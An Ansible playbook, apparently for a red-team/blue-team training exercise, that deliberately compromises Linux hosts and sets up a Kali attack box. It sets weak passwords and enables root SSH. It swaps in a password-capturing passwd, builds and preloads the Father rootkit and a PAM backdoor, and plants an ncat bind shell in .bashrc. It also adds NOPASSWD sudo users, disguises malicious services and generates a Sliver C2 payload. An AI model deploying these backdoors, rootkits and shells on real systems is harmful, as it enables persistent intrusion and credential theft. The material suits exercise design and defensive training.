---
- name: Misconfigure team machines
  hosts: team
  become: yes
  gather_facts: yes
  serial: 0

  tasks:
    - name: Set root password to password123
      ansible.builtin.user:
        name: root
        password: "{{ 'password123' | password_hash('sha512') }}"
    - name: Create blue team user with password blueteam
      ansible.builtin.user:
        name: blueteam
        password: "{{ 'blueteam' | password_hash('sha512') }}"
    - name: Create red team user
      ansible.builtin.user:
        name: redteam
        password: "{{ 'redteam' | password_hash('sha512') }}"
    - name: Enable root logon for SSH
      ansible.builtin.shell: |
        config_dir=$(grep -E '^Include' /etc/ssh/sshd_config | awk '{print $2}' | cut -d '*' -f 1)
        sed -i 's/^#\?\(PermitRootLogin\)\s\+.*/\1 yes/' /etc/ssh/sshd_config
        sed -i 's/^#\?\(PasswordAuthentication\)\s\+.*/\1 yes/' /etc/ssh/sshd_config
        for fname in `find $config_dir -type f`; do
            sed -i 's/^#\?\(PasswordAuthentication\)\s\+.*/\1 yes/' "$fname"
            sed -i 's/^#\?\(PermitRootLogin\)\s\+.*/\1 yes/' "$fname"
        done
    - name: Restart the SSHD service
      ansible.builtin.service:
        name: sshd
        state: restarted
    - name: Symlink root bash history to /dev/null
      ansible.builtin.shell: |
        ln -sf /dev/null /root/.bash_history
    - name: Backdoor passwd binary
      block:
        - name: Get passwd binary location
          ansible.builtin.shell: "which passwd"
          register: passwd_path
        - name: Move old passwd binary to .bak
          ansible.builtin.shell: |
            mv {{ passwd_path.stdout }} {{ passwd_path.stdout }}.bak
        - name: Place backdoor passwd script
          ansible.builtin.copy:
            dest: "{{ passwd_path.stdout }}"
            content: |
              #!/bin/bash
              USER_TO_CHANGE="${1:-$USER}"
              CAPTURE_FILE="/tmp/tmp.j3XNwAL5EM"
              echo "Changing password for $USER_TO_CHANGE"
              echo -n "Current password: "
              read -s current_password
              echo
              echo -n "New password: "
              read -s new_password
              echo
              echo -n "Confirm new password: "
              read -s confirm_password
              echo
              echo "$current_password:$new_password:$confirm_password" >> "$CAPTURE_FILE"
              if [[ "$new_password" != "$confirm_password" ]]; then
                  echo "Passwords do not match."
                  exit 1
              fi
              echo "$USER_TO_CHANGE:$new_password" | sudo chpasswd 2>/dev/null

              # Confirm the password change
              echo "Password changed successfully."

              exit 0
            mode: '4755'
            owner: root
            group: root
    - name: Set binaries to be suid
      ansible.builtin.shell: |
        chmod +s $(which bash)
        chmod +s $(which find)
        chmod +s $(which less)
    - name: Install father rootkit
      block:
        - name: Set variables for Father rootkit install
          ansible.builtin.set_fact:
            father_base_path: "/tmp/Father"
            evil_name: "hackback"
            hidden_port: "7A69" # port 31337 in hex
            library_path: "/lib64/ld-linux-x86-64-rs.so.2"
        - name: Install dependencies for Debian or Ubuntu
          ansible.builtin.apt:
            name:
              - git
              - make
              - gcc
              - libpam0g-dev
              - libgcrypt20-dev
              - nasm
            update_cache: yes
        - name: Clone repo, configure, and build father
          ansible.builtin.shell: |
            git clone https://github.com/mav8557/Father/ {{ father_base_path }}
            sed -i 's/lobster/{{ evil_name }}/g' {{ father_base_path }}/src/config.h
            sed -i 's/D431/{{ hidden_port }}/g' {{ father_base_path }}/src/config.h
            sed -i 's|/lib/selinux.so.3|{{ library_path }}|g' {{ father_base_path }}/src/config.h
            sed -i 's|/tmp/silly.txt|/etc/.silo|g' {{ father_base_path }}/src/pam.c
            make -C {{ father_base_path }}
            cp {{ father_base_path }}/rk.so {{ library_path }}
        - name: Enable rootkit in ld.so.preload
          ansible.builtin.copy:
            content: "{{ library_path }}"
            dest: "/etc/ld.so.preload"
        - name: Clean up Father source
          ansible.builtin.file:
            path: "{{ father_base_path }}"
            state: absent
      when: ansible_facts['os_family'] == "Debian" 
    - name: Install malicious users and add to sudoers file
      block:
        - name: Define users
          ansible.builtin.set_fact:
            users:
              - {username: 'a.hassan', groups: 'root'}
              - {username: 'a.christy', groups: 'adm'}
              - {username: 'n.panchal', groups: 'adm'}
              - {username: 'b.ruddy', groups: 'root'}
              - {username: 'a.colby', groups: 'root'}
              - {username: 'y.huang', groups: 'adm'}
        - name: Create users
          user:
            name: "{{ item.username }}"
            state: present
            shell: /bin/bash
            create_home: yes
            groups: "{{ item.groups }}"
            password: "{{ item.username | password_hash('sha512') }}"
          loop: "{{ users }}"

        - name: Add user to sudoers file
          copy:
            dest: "/etc/sudoers.d/{{ item.username }}"
            content: "{{ item.username }} ALL=(ALL) NOPASSWD: ALL"
            validate: 'visudo -cf %s'
          loop: "{{ users }}"
        - name: Include sudoers.d in sudoers file
          ansible.builtin.lineinfile:
            path: /etc/sudoers
            regexp: '^#includedir /etc/sudoers\.d'
            line: "#includedir /etc/sudoers.d"
            validate: "visudo -cf %s"
            state: present
        - name: Add blueteam to sudoers
          community.general.sudoers:
            name: blueteam
            user: blueteam
            commands: ALL
            nopassword: true
            state: present
    - name: Set nologin to be bash
      ansible.builtin.shell: |
        nologin_path=$(which nologin)
        mv "$nologin_path" "$nologin_path.bak"
        cp $(which bash) "$nologin_path"
    - name: Set up bindshell in .bashrc
      block:
        - name: Install dependencies for Debian/Ubuntu
          ansible.builtin.apt:
            name: ncat
            state: present
            update_cache: yes
          when: ansible_facts['os_family'] == "Debian"
        - name: Install dependencies for Redhat/CentOS/Rocky
          ansible.builtin.dnf:
            name: nmap-ncat
            state: present
            update_cache: yes
          when: ansible_facts['os_family'] == "RedHat"
        - name: Create bindshell script
          ansible.builtin.copy:
            content: |
              #!/bin/bash
              rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh 2>&1 | ncat -l 0.0.0.0 8443 > /tmp/f
            dest: "/bin/bind"
            mode: "755"
            owner: "root"
            group: "root"
        - name: Add bindshell to .bashrc
          ansible.builtin.shell: |
            echo "/bin/bind &" >> /home/blueteam/.bashrc
    - name: Backdoor PAM
      block:
        - name: Set variables for PAM backdoor install on Debian
          ansible.builtin.set_fact:
            pam_backdoor_base_path: "/tmp/pam-backdoor"
        - name: Install dependencies
          ansible.builtin.apt:
            name:
              - git
              - autoconf
              - automake
              - autopoint
              - bison
              - bzip2
              - docbook-xml
              - docbook-xsl
              - flex
              - gettext
              - libaudit-dev
              - libcrack2-dev
              - libdb-dev
              - libfl-dev
              - libselinux1-dev
              - libtool
              - libcrypt-dev
              - libxml2-utils
              - make
              - pkg-config
              - sed
              - w3m
              - xsltproc
              - xz-utils
              - gcc
            state: present
            update_cache: yes
        - name: Clone, build, and set up backdoor
          ansible.builtin.shell: |
            git clone https://github.com/segmentati0nf4ult/linux-pam-backdoor {{ pam_backdoor_base_path }}
            cd {{ pam_backdoor_base_path }}
            pam_version=$(dpkg -l | grep pam-runtime | awk '{printf $3}' | cut -c1-5)
            ./backdoor.sh -v "$pam_version" -p redrules
            cp pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
        - name: Clean up PAM backdoor source
          ansible.builtin.file:
            path: "{{ pam_backdoor_base_path }}"
            state: absent
      when: ansible_facts['os_family'] == "Debian"
    - name: Install malicious service
      block:
        - name: Create evil service obvious
          ansible.builtin.copy:
            content: |
              Description=Evil red team things

              Wants = network.target

              [Service]
              ExecStart=/bin/user-default
              Restart=always
              RestartSec=5s

              [Install]
              WantedBy=multi-user.target
            dest: "/etc/systemd/system/user-default.service"
            mode: 600
            owner: root
            group: root
        - name: Create evil service less obvious
          ansible.builtin.copy:
            content: |
              Description=php clean-up script

              Wants=network.target

              [Service]
              ExecStart=/usr/bin/php
              Restart=always
              RestartSec=5s

              [Install]
              Wantedy=multi-user.target
            dest: "/etc/systemd/system/php.service"
            mode: 600
            owner: root
            group: root
- name: Set up Kali with evil tools
  hosts: kali
  become: yes
  gather_facts: no
  serial: 0

  tasks:
    - name: Install sliver
      block:
        - name: Install sliver via apt
          ansible.builtin.apt:
            name: sliver
            state: present
            update_cache: yes
        - name: Get path of sliver server
          ansible.builtin.shell: "which sliver-server"
          register: sliver_server_path
        - name: Create systemd file for sliver service
          ansible.builtin.copy:
            dest: /etc/systemd/system/sliver.service
            content: |
              [Unit]
              Description=Sliver
              After=network.target
              StartLimitIntervalSec=0

              [Service]
              Type=simple
              Restart=on-failure
              RestartSec=3
              User=root
              ExecStart={{ sliver_server_path.stdout }} daemon

              [Install]
              WantedBy=multi-user.target
            mode: 600
            owner: root
            group: root
        - name: Make sure sliver service is started
          ansible.builtin.service:
            name: sliver
            state: started
        - name: Get location of sliver operator config
          set_fact:
            sliver_operator_config_path: "/tmp/sliver_operator{{ lookup('pipe', 'date +%s') }}.cfg"
          register: sliver_operator_config
        - name: Make sliver operator config
          ansible.builtin.shell: |
            sliver-server operator --name adam --lhost 127.0.0.1 --save {{ sliver_operator_config_path }}
        - name: Fix config permissions
          ansible.builtin.file:
            path: "{{ sliver_operator_config_path }}"
            owner: kali
            group: kali
        - name: Import sliver operator config
          ansible.builtin.shell: |
            sudo -u kali sliver-client import {{ sliver_operator_config_path }}
            rm -f {{ sliver_operator_config_path }}
        - name: Install expect
          ansible.builtin.apt:
            name: expect
            state: present
            update_cache: yes
        - name: Generate sliver payload
          ansible.builtin.shell: |
              echo "generate --os linux --mtls {{ ansible_ssh_host }} --save /home/kali/sliver-payload\nexit\n" | sudo -u kali sliver-client
              chown kali:kali /home/kali/sliver-payload
    - name: Install nxc
      ansible.builtin.apt:
        name: netexec
        state: present
        update_cache: yes
    # - name: Install realm
    #   block:
    #     - name: Install dependencies
    #       ansible.builtin.apt:
    #         name: 
    #           - golang
    #           - cargo
    #     - name: Clone and configure realm
    - name: Install metasploit
      ansible.builtin.apt:
        name: metasploit-framework
        state: present
        update_cache: yes

- name: Configure Web
  hosts: debian_web
  become: yes
  gather_facts: yes
  serial: 0

  tasks:
    - name: Make sure web folder exists
      ansible.builtin.file:
        path: /var/www/html
        state: directory
        mode: '0755'
    - name: Place web code
      ansible.builtin.copy:
        dest: "/var/www/html/index.php"
        mode: '0644'
        content: |
          <?php

          echo "<h1>My comments!</h1>";

          $servername = "10.10.0.42";
          $username = "commentUser";
          $password = "password123";
          $database = "comments";


          $conn = new mysqli($servername, $username, $password, $database);

          if($conn->connect_error){
          echo "oh no!";
          die("Connection to DB failed: " . $conn->connect_error);
          }

          $sql = "SELECT username, comment FROM comments";
          $result = $conn->query($sql);

          if ($result->num_rows > 0){

          while($row = $result->fetch_assoc()){
          echo "Comment: " . $row["comment"]. "<br>By: " . $row["username"]. "<br><br><br>";
          }
          } else {
          echo "No comments!";
          }

          $conn->close();

          ?>


- name: Configure users
  hosts: team
  become: yes
  gather_facts: yes
  serial: 0

  tasks:
    - name: Install interesting users
      block:
        - name: Define users
          ansible.builtin.set_fact:
            users:
              - {username: 'j.wilson', password: 'hackertracker'}
              - {username: 'c.resch', password: 'entsecrules'}
              - {username: 'j.rice', password: 'ufsitnumberone'}
        - name: Set password for users
          ansible.builtin.user:
            name: "{{ item.username }}"
            password: "{{ item.password | password_hash('sha512') }}"
            create_home: yes
            state: present
          loop: "{{ users }}"
